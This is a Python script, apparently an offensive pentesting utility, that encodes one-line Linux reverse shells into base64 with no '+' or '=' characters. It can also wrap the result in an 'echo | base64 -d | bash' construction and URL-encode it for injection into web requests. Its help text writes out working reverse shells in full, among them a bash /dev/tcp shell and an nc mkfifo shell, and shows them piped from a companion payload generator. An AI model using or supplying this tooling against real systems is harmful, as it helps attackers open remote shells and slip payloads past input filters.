#!/usr/bin/env python
# Given a onliner linux reverse shell, generates a safe base64 encoding payload version
# There's an option, --echo, that constructs "echo -n <payload_b64>|base64 -d|bash" payloads
# There's an option, --url, only useful when --echo enabled, replacing spaces by "+"
# Pipe it wiht rs_onliner.py when appropiate payload for linux.
#
# arale61


from argparse import ArgumentParser, RawDescriptionHelpFormatter
from base64 import b64decode, b64encode
import sys


def usage(p:ArgumentParser):
    p.print_help()
    exit(1)


def parse_arguments():
    parser = ArgumentParser(
        formatter_class=RawDescriptionHelpFormatter,
        description='Safe base64 encoder for bash one-line reverse shells',
        epilog='''
Examples:

1. Simple safe base64 encode:
./rs_b64encode.py -p 'bash -i >& /dev/tcp/127.0.0.1/6161 0>&10'

2. Simple safe base64 encode and use echo decode construct:
echo 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 6161 >/tmp/f' | ./rs_b64encode.py --echo
or
./rs_b64encode.py -p 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 6161 >/tmp/f' --echo

4. Piping with rs_oneliner.py:
./rs_oneliner.py -i 127.0.0.1 -p 6161 --python | ./rs_b64encode.py

5. Piping with rs_oneliner.py and construction echo decode payload:
./rs_oneliner.py -i 127.0.0.1 -p 6161 --perl | ./rs_b64encode.py --echo

6. Piping into rs_b64encode.py and construction echo decode url_quote_plus encode payload:
./rs_oneliner.py -i 127.0.0.1 -p 6161 --phpsystem | ./rs_b64encode.py --echo --url

Util scripts by arale61
''')

    parser.add_argument('-p', '--payload', help='The one-line bash reverse shell payload')
    parser.add_argument('--echo', action='store_true', help='Prints full echo construction')
    parser.add_argument('--url', action='store_true', help='Prints full echo construction')

    args = parser.parse_args()

    p = args.payload or ""
    e = args.echo
    u = args.url

    if len(p) == 0:
        p = input()        
    
    if len(p) == 0:
        usage(parser)
        
    return (p,e,u)


def get_decoded_version(payload, encoding='utf-8'):
    try:
        return b64decode(payload.encode(encoding)).decode(encoding)
    except:
        return payload


def get_spaces_indexes(payload):
    spaces = []
    i = 0
    for i in range(len(payload)):
        if payload[i] in [' ',',','(',')',';']:
            spaces.append(i)
    return spaces


def get_last_valid_space_index(encoded_payload, payload, invalid_char_index):
    spaces = get_spaces_indexes(payload)
    if len(spaces) <= 0:
        raise "Invalid payload."
    poorsman_simple_ratio = len(encoded_payload) / len(payload)
    return max([x for x in spaces if x*poorsman_simple_ratio <= invalid_char_index])


def safe_encode(payload="", encoding='utf-8'):
    result = b64encode(payload.encode(encoding)).decode(encoding)
    max_iterations = 100
    iteration = 0
    while True or  iteration < max_iterations:
        if '+' in result or '=' in result:
            decoded_payload = b64decode(result.encode(encoding)).decode(encoding)
            index_bad_char = result.find('+')
            if index_bad_char < 0:
                index_bad_char = result.find('=')
                        
            last_space_index = get_last_valid_space_index(result, decoded_payload, index_bad_char)
            result = b64encode(f"{decoded_payload[:last_space_index]} {decoded_payload[last_space_index:]} ".encode(encoding)).decode(encoding)
            iteration += 1
        else:
            return result


def add_echo_construction(payload, url_encode):
    if url_encode:
        return f"echo+-n+{payload}|base64+-d|bash"
    return f"echo -n {payload}|base64 -d|bash"


if __name__ == "__main__":
    payload, do_echo, do_url = parse_arguments()
    safe_encoded_version = safe_encode(get_decoded_version(payload.strip()))
    if do_echo:
        safe_encoded_version = add_echo_construction(safe_encoded_version, do_url)
    print(safe_encoded_version)